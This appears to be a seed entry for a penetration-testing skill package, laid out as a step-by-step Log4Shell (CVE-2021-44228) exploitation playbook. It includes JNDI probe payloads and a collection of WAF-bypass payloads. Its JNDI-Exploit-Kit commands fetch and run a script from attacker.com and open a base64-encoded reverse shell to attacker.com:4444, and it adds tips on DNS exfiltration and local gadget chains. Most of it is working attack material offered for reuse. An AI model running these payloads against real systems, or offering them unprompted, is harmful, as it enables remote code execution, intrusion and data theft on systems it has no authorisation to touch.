# [Seed] Log4Shell (CVE-2021-44228) JNDI Injection to RCE

## Scenario Category
Penetration testing / Web RCE

## Target Overview
A Java web application running an affected version of Log4j2 (< 2.17.0). Any user-controlled field that gets logged triggers a remote JNDI lookup, so standing up an LDAP/RMI service that serves a malicious class gives code execution on the target host.

## Full Execution Chain

1. Target identification
   - HTTP headers `Server` and `X-Powered-By` reveal a Java application framework (Tomcat/Spring/Liferay)
   - Version fingerprinting: login page, 404 page, path disclosure
   - Vulnerability confirmation: send a probe payload through any field that can end up in the logs (User-Agent, Referer, X-Forwarded-For, login username, search box)
2. Set up the OOB listener
   - DNSLog platform (dnslog.cn / interactsh / Burp Collaborator)
   - Self-hosted LDAP service (marshalsec / JNDI-Exploit-Kit)
3. Probe for the vulnerability
   ```
   ${jndi:ldap://abc123.dnslog.cn/x}
   ```
   Inject it into User-Agent and similar fields. If the DNSLog platform records a lookup for `abc123.dnslog.cn`, it is confirmed
4. Stand up the exploit service (your own public VPS or an ngrok reverse tunnel)
   ```bash
   java -jar JNDI-Exploit-Kit.jar -L 0.0.0.0:1389 -P 0.0.0.0:8888 -C 'curl http://attacker.com/sh|bash'
   ```
5. Fire the exploitation payload
   ```
   ${jndi:ldap://attacker.com:1389/Basic/Command/base64/Y3VybCBodHRwOi8vYXR0YWNrZXIuY29tL3NofGJhc2g=}
   ```
6. Catch the reverse shell, then continue with privilege escalation / persistence per the attack-chain playbook

## Pitfalls Encountered

| Problem | Cause | Solution | Time spent |
|------|------|---------|------|
| Probe payload produced no DNS callback | Target sits on an internal network with no internet access | Use a DNS-only OOB service such as oast.online, or test against an internal DNSLog | 1h |
| DNS resolved but LDAP was unreachable | Egress policy only allows DNS | Switch to DNS exfiltration to pull data out directly instead of going through LDAP | 1.5h |
| LDAP reachable but the target would not load the class | Newer JDKs (8u191+/11.0.1+/...) default to `com.sun.jndi.ldap.object.trustURLCodebase=false` | Switch to a local gadget chain such as `Tomcat` / `Groovy` / `BeanFactory` (no remote class loading needed) | 3h |
| Double quotes got escaped / payload blocked by the WAF | Various ${} nesting tricks bypass the off-the-shelf rules | Use nested bypasses like `${${::-j}ndi:...}` / `${${lower:j}ndi:...}` / `${env:xx:-jndi}` | 1h |
| Vulnerability triggered but no shell came back | Special characters in the command got mangled by Runtime.exec | Wrap it in a base64 layer: `bash -c {echo,base64}|{base64,-d}|bash` | 30min |
| Could not reproduce on a Spring Boot app | Spring uses Logback, not Log4j2 | Check the dependency tree to see whether spring-boot-starter-log4j2 is pulled in | 20min |

## Toolchain Findings

- **JNDI-Exploit-Kit** (welk1n / pimps) spins up LDAP+RMI+HTTP in one command and supports local gadget bypasses
- **JNDI-Injection-Exploit** is the older project, covers more gadgets but is no longer maintained
- **Nuclei** template `cves/2021/CVE-2021-44228.yaml` is good for scanning assets to see which are affected
- **interactsh-client** from ProjectDiscovery, a self-hosted OOB service that is more private than dnslog.cn
- **CrowdStrike CVE-2021-44228 scanner** detects JndiLookup.class at the binary level

## Key Code/Commands

WAF bypass payload collection:

```text
${jndi:ldap://x.dnslog.cn/a}                    # basic
${${::-j}ndi:ldap://x.dnslog.cn/a}              # nesting
${${lower:j}ndi:ldap://x.dnslog.cn/a}           # lower
${${upper:j}ndi:ldap://x.dnslog.cn/a}           # upper
${${env:NaN:-j}ndi:ldap://x.dnslog.cn/a}        # env fallback
${jndi:${lower:l}${lower:d}a${lower:p}://...}   # maximum character splitting
${jndi:dns://x.dnslog.cn}                       # DNS channel
${jndi:rmi://attacker.com:1099/a}               # RMI instead of LDAP
```

Starting the interactsh service:

```bash
interactsh-client -v
# output: abc123.oast.online <- use this domain in place of dnslog in the payload
```

One-shot exploitation with JNDI-Exploit-Kit:

```bash
java -jar JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar \
  -L attacker.com:1389 \
  -P attacker.com:8888 \
  -C 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYx}|{base64,-d}|bash'
# prints several usable payloads, pick one and inject it into the target
```

## Suggested Improvements to This Package

- Create a dedicated `pentest-tools/references/log4shell-bypass-payloads.md` collecting 50+ bypass payloads
- The nuclei template already ships with the tool, so remind the user to run `nuclei -t cves/2021/CVE-2021-44228.yaml -l targets.txt`
- Add a standard action checklist to attack-chain for "after gaining internal network access via Log4Shell"

## Reusable Patterns/Script Snippets

**Three-step Log4Shell probing method**:

```text
1. Blast ${jndi:ldap://oob/a} across many fields, then check the OOB platform for callbacks
2. Callback received -> stand up a local-gadget LDAP service (no remote class loading) -> push the payload
3. No callback -> switch to the DNS channel for out-of-band data exfiltration
```

**Key decision points**:

```text
- DNSLog callback received but LDAP unreachable -> newer JDK, a local gadget is mandatory
- DNS also blocked -> internal OOB / second-order reflection (hit a secondary system that does have egress first)
- No response when the command contains special characters -> wrap it in base64
```

## Evolution Actions
- [x] The routing matrix already carries the "Log4j" / "JNDI injection" keywords
- [ ] Create a standalone log4shell-bypass-payloads.md
- [ ] Add interactsh-client to the bootstrap manifest

## Environment Details
- Attack box: Kali, Java 8 (to run the LDAP service)
- OOB platforms: dnslog.cn / oast.online / self-hosted interactsh
- Target: any Java web app running Log4j2 < 2.17.0

## Redaction Requirements
This entry is seed data written from public CVE information and does not involve any real production target. All domains/IPs are placeholder examples.
